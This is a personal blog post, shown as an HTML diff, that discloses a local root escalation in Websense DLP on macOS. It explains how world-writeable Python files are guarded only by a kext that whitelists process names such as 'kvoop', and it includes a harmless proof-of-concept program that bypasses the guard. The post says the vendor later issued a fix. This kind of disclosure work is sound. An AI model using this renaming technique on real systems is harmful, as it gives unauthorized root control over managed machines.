@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<title>Die wunderbare Welt von Isotopp - Websense DLP gives instant root</title>
+<meta name="description" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="manifest" href="site.webmanifest">
+<link rel="apple-touch-icon" href="icon.png">
+<link rel="favicon.ico" rel="icon" type="image/ico">
+
+
+
+
+
+	
+
+
+
+<link rel="stylesheet" href="/style.min.c5e5cd61f54911f9aafd1dbe09c2f90667957bfe1002126c87aace57759f3446.css">
+
+
+    </head>
+    <body>
+        
+
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+    <div class="container-fluid">
+	<a class="navbar-brand" href="" rel="home" title=".Site.Title">
+	    Die wunderbare Welt von Isotopp
+	</a>
+	<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+	</button>
+
+	<div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav mr-auto">
+		
+		
+		<li class="nav-item ">
+                    <a class="nav-link" href="/about/">
+			
+			<span>About</span>
+			<span class="visually-hidden">(Current)</span>
+		    </a>
+		    
+		</li>
+            </ul>
+            
+	</div>
+    </div>
+</nav>
+
+
+        <main role="main" class="container-fluid">
+
+            
+
+
+<div class="page">
+    <article class="websense-dlp-gives-instant-root-page">
+	<h1 class="title">
+            Websense DLP gives instant root
+	</h1>
+
+	<p>Enterprise security software is interesting, because in order to do what it does it often uses privilege, but it is also very often written extremely badly.</p>
+<p>In [ASLR]({% link _posts/2017-10-20-aslr.md %}) we have had a look on the Trend Micro binary on MacOS and found that it is running as root, and with ASLR off. That means we have a privileged process that is being loaded at a fixed address, and that process is parsing random user generated data in order to scan it for viruses. If we manage to find a bug in that code, we have a way to make this privileged process do our bidding – by simply putting a special file into a directory that is being scanned by the virus scanner.</p>
+<p>Because ASLR is off, that antivirus process is at the same, fixed address on every machine running the same OS version and Trendmicro version. This means: our bug works the same way on every single machine with these properties. We basically control the entire fleet of machines at once.</p>
+<p>Such thoughts are not hypothetical problems. Let&rsquo;s have a look at another enterprise security product and how that works, for real.</p>
+<h2 id="websense-dlp-is-installed-and-it-is-python">
+    <a href="#websense-dlp-is-installed-and-it-is-python">
+	Websense DLP is installed and it is Python
+    </a>
+</h2>
+<p>So yesterday morning when I came to work, my Macbook Air had crashed.</p>
+<p>On Reboot, the jamf installed a bunch of patches and new stuff. I ran the usual fast <a href="https://aide.github.io/" target="_blank" rel="noopener">AIDE</a>
+
+ check I do every morning, and found a bunch of modified system files, among them WebSense DLP as announced by Corporate a while ago.</p>
+<p>I found a bunch of files in <code>/Library/Application Support/Websense Endpoint</code> and was immediately fascinated, because apparently this installs a complete version of Python 2.5.</p>
+<pre><code class="language-console" data-lang="console">$ find . -iname python2\*
+./EPClassifier/python/bin/python2.5
+$ EPClassifier/python/bin/python2.5
+Python 2.6.9 (unknown, Feb  7 2017, 00:08:08)
+[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt;
+</code></pre><p>Okay, so they lie about that. It’s 2.6.</p>
+<p>On the other hand, they deliver their application as a bunch of <code>.pyc</code> (compiled python bytecode) files.</p>
+<pre><code class="language-console" data-lang="console">$ find  . -iname \*.pyc
+./EPClassifier/CryptoInterface.pyc
+./EPClassifier/policies/file_detectors/ASMDetector.pyc
+./EPClassifier/policies/file_detectors/CAD_STL.pyc
+...
+</code></pre><p>We can read that, using <a href="https://github.com/rocky/python-uncompyle6" target="_blank" rel="noopener">uncompyle6</a>
+
+: <code>brew install python3; pip3 install uncompyle6</code>, because I am lazy and don’t want to mess with a venv right here and now.</p>
+<p>I’d want that in my path all the time anyway.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">$</span> uncompyle6 <span style="color:#f92672">./</span>EPClassifier<span style="color:#f92672">/</span>policies<span style="color:#f92672">/</span>scripts<span style="color:#f92672">/</span>pyLogger<span style="color:#f92672">.</span>pyc
+<span style="color:#75715e"># uncompyle6 version 3.2.3</span>
+<span style="color:#75715e"># Python bytecode 2.5 (62131)</span>
+<span style="color:#75715e"># Decompiled from: Python 3.7.0 (default, Jul  9 2018, 09:48:45)</span>
+<span style="color:#75715e"># [Clang 9.0.0 (clang-900.0.39.2)]</span>
+<span style="color:#75715e"># Embedded file name: .\pyLogger.py</span>
+<span style="color:#f92672">import</span> codecs<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> threading
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PyLogger</span>(object):
+
+    <span style="color:#66d9ef">def</span> __init__(self, debugName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, fileName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pyLogger_svm_default_log_file.txt&#39;</span>):
+        self<span style="color:#f92672">.</span>debugName <span style="color:#f92672">=</span> debugName
+        self<span style="color:#f92672">.</span>fileName <span style="color:#f92672">=</span> fileName
+        self<span style="color:#f92672">.</span>myMutex <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Lock()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debug</span>(self, massage_to_write):
+        time_str <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H-%M-%S&#39;</span>, time<span style="color:#f92672">.</span>localtime())
+        string_to_write <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> pyLogger debug message: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (time_str, massage_to_write)
+        self<span style="color:#f92672">.</span>myMutex<span style="color:#f92672">.</span>acquire()
+        log_debug_file <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>open(self<span style="color:#f92672">.</span>fileName, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;utf-16&#39;</span>)
+        log_debug_file<span style="color:#f92672">.</span>write(string_to_write)
+        log_debug_file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+        log_debug_file<span style="color:#f92672">.</span>close()
+        self<span style="color:#f92672">.</span>myMutex<span style="color:#f92672">.</span>release()
+<span style="color:#75715e"># okay decompiling ./EPClassifier/policies/scripts/pyLogger.pyc</span>
+</code></pre></div><h2 id="its-all-world-writeable-or-is-it">
+    <a href="#its-all-world-writeable-or-is-it">
+	It&rsquo;s all world-writeable, or is it?
+    </a>
+</h2>
+<p>That’s fun, I thought and then I saw the file permissions.</p>
+<pre><code class="language-console" data-lang="console">$ ls -l ./EPClassifier/policies/scripts/pyLogger.pyc
+-rw-rw-rw-  1 root  admin  1130 Nov 14  2017 ./EPClassifier/policies/scripts/pyLogger.pyc
+</code></pre><p>Is it really a good idea to have system security software installed with world-writeable files?</p>
+<p>I asked in our internal security forum, and apparently WebSense has an anti-tampering protection.</p>
+<pre><code class="language-console" data-lang="console">$ kextstat | grep -v com.apple | awk '{ print $1, $6 }'
+Index Name
+15 com.displaylink.driver.DisplayLinkDriver
+91 com.asix.driver.ax88179-178a
+131 com.Cylance.CyProtectDrvOSX
+146 com.websense.endpoint.process.kpi
+147 com.websense.endpoint.process
+148 com.websense.endpoint.dlp
+</code></pre><p>The number 148, <code>com.websense.endpoint.dlp</code>, is the kernel module that &ldquo;protects&rdquo; these files: As a user or as root, when you try to modify one of the world writeable files, the module intercepts and blocks the call.</p>
+<pre><code class="language-console" data-lang="console">com.websense.endpoint.dlp: [WARNING:ws_anti.c:364] Blocking the attempt to modify or delete /Library/Application Support/Websense Endpoint/EPClassifier/python/lib/python2.5/sqlite3/__init__.py, pid:73968, process:vim, action: 0x4
+</code></pre><p>Challenge accepted.</p>
+<h2 id="a-kext-is-just-code-lets-have-a-look">
+    <a href="#a-kext-is-just-code-lets-have-a-look">
+	A kext is just code. Let&rsquo;s have a look.
+    </a>
+</h2>
+<pre><code class="language-console" data-lang="console">$ pwd
+.../Websense Endpoint/DLP/WebsenseEndpointDLP.kext/Contents/MacOS
+$ ls -l
+total 440
+-rwxr-xr-x  1 kris  staff  223056 Jun  4 23:52 WebsenseEndpointDLP
+</code></pre><p>That’s the kext, the one which registers itself as <code>com.websense.endpoint.dlp</code> in <code>kextstat</code>.</p>
+<p>We can load it into <a href="https://www.hopperapp.com/" target="_blank" rel="noopener">Hopper</a>
+
+. Hopper is a $99 IDAPro Clone with a nice Python API. You can also use the free version of IDApro, or the NSA Ghidra to achieve the same.</p>
+<p>Turns out, the kext is delivered with a full symbol table. Here is what you see when you start Hopper, drag the kext into it and click on the symbol that inits the kernel extension:</p>
+<p><a href="/uploads/2018/06/hopper-01.jpg"><p class="md__image">
+  <img src="/uploads/2018/06/hopper-01.jpg" alt=""  />
+</p>
+
+</a>
+
+</p>
+<p><em>Initial glance at the kext after loading. We have symbols. That&rsquo;s almost like cheating.</em></p>
+<p>There is a tempting call to <code>_ws_anti_tampering_initialize()</code>, but I have learned to do things differently a long time ago. The error message read &ldquo;Blocking the attempt to modify or delete&rdquo;.</p>
+<p>That&rsquo;s here:</p>
+<p><a href="/uploads/2018/06/hopper-02.jpg"><p class="md__image">
+  <img src="/uploads/2018/06/hopper-02.jpg" alt=""  />
+</p>
+
+</a>
+
+</p>
+<p><em>Two places in vnode_listener_callback_9135</em></p>
+<p>We are looking at a vnode listener, which is a type of <a href="https://www.apriorit.com/dev-blog/411-mac-os-x-kauth-listeners" target="_blank" rel="noopener">kauth</a>
+
+ listener, which is a MacOS thing to monitor or block access to files. It’s what all the Cybersnakeoil is using. It’s also what’s making your <code>git checkout</code> slow.</p>
+<p>And here is the callback:</p>
+<p><a href="/uploads/2018/06/hopper-03.jpg"><p class="md__image">
+  <img src="/uploads/2018/06/hopper-03.jpg" alt=""  />
+</p>
+
+</a>
+
+</p>
+<p><em>Read the highlighted code&hellip;</em></p>
+<p>There is little going on here until we hit the highlighted code. You can’t see all of it, but that does not matter.</p>
+<p>The code calls <a href="https://developer.apple.com/documentation/kernel/1488959-proc_name?language=objc" target="_blank" rel="noopener">proc_name()</a>
+
+, which gets the current process title in the kernel context. It then compares this name to a list of approved process names.</p>
+<p>If there is a match, no blockage happens from the kext.</p>
+<p>So, anything called</p>
+<ul>
+<li>EndPointClassifier</li>
+<li>kvoop</li>
+<li>CryptoTool</li>
+<li>InstallerTools</li>
+<li>Websense Endpoint</li>
+<li>TRITON AP-ENDPOINT</li>
+<li>Websense Endpoint Helper</li>
+<li>DLPHelperService</li>
+<li>efw_cache_update</li>
+<li>installd</li>
+<li>installer</li>
+<li>rc.deferred_install</li>
+<li>shove</li>
+<li>Google Chrome</li>
+<li>Websense Endpoint RF Notification</li>
+</ul>
+<p>is approved to bypass the protection afforded by kext 148.</p>
+<p>That makes a lot of sense, if you look at it - how are they going to update their code out in the world? Some programs must be allowed to write to it – that&rsquo;s how <code>InstallerTools</code>, <code>CryptoTool</code>, <code>installd</code>, <code>installer</code> and <code>rc.deferred_install</code> as well as <code>shove</code> end up on this list.</p>
+<p>The others are likely convenience for Develoeprs that &ldquo;accidentally&rdquo; (through bad development processes) made it out into production code. It&rsquo;s likely that the bad permissions also ended up being shipped the same way – it makes a lot of sense for a developer to have these files world-writeable all the time when they are developing this product.</p>
+<p>In any case, other rules in the rest of the kernel still apply, so file permissions still work. But WebSense delivered a bunch of files world-writeable, relying on their kext to protect their application.</p>
+<p>They do load these world-writeable files into their python process, which runs as root, and happily execute them. So this is our hook: We overwrite any of these files with our own code, using our own program which we name <code>kvoop</code> (or anything from the list above), and then restart the machine. As it starts up, it loads our code and the box is ours.</p>
+<p>We get privilege escalation from local user to system administrator.</p>
+<h2 id="we-write-a-proof-of-concept">
+    <a href="#we-write-a-proof-of-concept">
+	We write a proof-of-concept
+    </a>
+</h2>
+<p>Can I prove that I can circumvent their protection?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span> cat probe.c
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> main() {
+    FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;version.plist&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fp) {
+        perror(<span style="color:#e6db74">&#34;Can&#39;t fopen</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+       exit(<span style="color:#ae81ff">1</span>);
+    }
+
+    fprintf(fp, <span style="color:#e6db74">&#34;Hello, world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    fclose(fp);
+    sleep(<span style="color:#ae81ff">60</span>);
+    exit(<span style="color:#ae81ff">0</span>);
+}
+</code></pre></div><p>This is a slight variation of the “hello world” program: It opens a file version.plist, writes &ldquo;Hello, world&rdquo; to the file, sleeps a minute and exits.</p>
+<p>First, expected behavior: Boy meets file, file is world writeable, boy tries to write file, and fails due to the kext doing the kauth thing and interfering.</p>
+<p>Hackerterrorcybercyber averted.</p>
+<pre><code class="language-console" data-lang="console">$ pwd
+/Library/Application Support/Websense Endpoint/EPClassifier/python/Resources
+$ ls -l version.plist 
+-rwxrwxrwx 1 root admin 454 May 26 07:13 version.plist
+$ &gt; version.plist
+-bash: version.plist: Permission denied
+</code></pre><p>Boy reverses the kext, reads the list of privileged filenames, names his &ldquo;hello world&rdquo; program kvoop from the list of privileged filenames and lo and behold:</p>
+<pre><code class="language-console" data-lang="console">$ kvoop
+^C
+$ cat version.plist
+Hello, world
+</code></pre><p>I pwn.</p>
+<h2 id="other-observations">
+    <a href="#other-observations">
+	Other observations
+    </a>
+</h2>
+<p>Websense DLP is one of the kind of products that inject a shared library (a Macos <code>.dylib</code>) into other processes. In our case, Chrome and Firefox are being targeted. This is not a stable interface, and <a href="https://www.techradar.com/news/google-chrome-keeps-crashing-it-might-be-your-antivirus" target="_blank" rel="noopener">Chrome or Firefox may crash</a>
+
+.</p>
+<p>Websense DLP relies on the <code>prog_name()</code> not only for exceptions in the kauth handler, but also in the selection of binaries to target for injection. For example, if I write a &ldquo;hello world&rdquo; program and rename it to <code>firefox</code>, there is a lot of commotion in the system log: Websense DLP tries to inject its libraries into my &ldquo;hello world&rdquo; program, which it mistakes for Firefox due to the program name, and fails, noisly.</p>
+<p>The same works in reverse: A firefox binary that is not named <code>firefox</code> is not recognized and does not get the shared library injected, so it flies under the radar.</p>
+<p>One wonders what the actual threat model is that this is supposed to protect against.</p>
+<h2 id="tldr">
+    <a href="#tldr">
+	TL;DR
+    </a>
+</h2>
+<p>We deployed Websense DLP across all company Macs, and anybody renaming their <code>vim</code> to <code>kvoop</code> can edit the files, which are then loaded into a privileged process and run as root.</p>
+<p><em>Websense DLP is an instant root on all Mac machines where it is being deployed.</em></p>
+<p><em>Addendum:</em> Security picked up on this, and communicated the problem to the vendor, which then shipped a fix. It is unknown to me if they also fixed their broken security processes. We ceased using the product shortly after that.</p>
+
+
+	
+    </article>
+</div>
+
+
+
+            <footer>
+    <p>
+	&copy; Copyright 2021 Someone or something
+    </p>
+</footer>
+
+
+        </main>
+
+	
+
+
+
+
+
+<script src="/js/bootstrap.js"></script>
+
+
+
+
+<script src="/js/lunr.js"></script>
+
+
+
+
+
+<script src="/js/app.js"></script>
+
+
+    </body>
+</html>
